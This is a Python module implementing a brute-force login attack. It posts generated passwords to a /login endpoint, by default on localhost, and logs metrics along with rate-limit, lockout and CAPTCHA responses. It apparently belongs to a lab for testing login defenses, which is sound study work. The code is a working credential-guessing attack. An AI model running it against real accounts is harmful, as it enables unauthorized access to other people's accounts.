import requests
import time
from .metrics import AttackMetrics
from .password_generator import PasswordGenerator


class BruteforceAttack:
    def __init__(self, base_url="http://127.0.0.1:5000"):
        self.base_url = base_url
        self.session = requests.Session()

    def attack(
        self,
        username: str,
        difficulty: str = "easy",
        metrics: AttackMetrics = None,
        delay: float = 0.01,
        max_attempts: int = None,
        max_time: float = None,
    ):
        """
        Bruteforce attack on a user

        Args:
            username: target username
            difficulty: password difficulty (easy, medium, hard)
            metrics: AttackMetrics object for data collection
            delay: delay between each attempt (in seconds)
            max_attempts: maximum number of attempts (None = try entire solution space)
            max_time: maximum time in seconds (None = no time limit)
        """
        password_generator = PasswordGenerator(
            difficulty=difficulty, max_attempts=max_attempts
        )

        max_time_str = f"{max_time}s" if max_time else "unlimited"
        max_attempts_str = str(max_attempts) if max_attempts else "unlimited"
        print(
            f"Starting Bruteforce on '{username}' (difficulty: {difficulty}, max_attempts: {max_attempts_str}, max_time: {max_time_str})..."
        )

        metrics.start()
        found_password = None
        i = 0
        start_time = time.time()

        for password in password_generator.generate_bruteforce():
            if max_time is not None:
                elapsed_time = time.time() - start_time
                if elapsed_time >= max_time:
                    print(f"Time limit reached ({max_time}s) after {i} attempts")
                    break
            i += 1
            start = time.time()

            try:
                response = self.session.post(
                    f"{self.base_url}/login",
                    json={"username": username, "password": password},
                    timeout=30,
                )

                latency = int((time.time() - start) * 1000)

                if response.status_code == 200:
                    data = response.json()
                    success = data.get("success", False)

                    if success:
                        found_password = password
                        metrics.record_attempt(True, latency)
                        print(f"PASSWORD FOUND: {password} (attempt #{i})")
                        break
                    else:
                        metrics.record_attempt(False, latency)
                else:
                    metrics.record_attempt(False, latency)

                    if response.status_code == 429:
                        print(f"Rate limited at attempt #{i}")
                    elif response.status_code == 403:
                        data = response.json()
                        if "locked" in data.get("error", ""):
                            print(f"Account locked at attempt #{i}")
                        elif data.get("captcha_required"):
                            print(f"CAPTCHA required at attempt #{i}")

            except Exception as e:
                print(f"Error: {e}")
                metrics.record_attempt(False, 0)

            if delay > 0:
                time.sleep(delay)

        metrics.stop()

        if not found_password:
            print(f"Failed: password not found after {i} attempts")

        return found_password
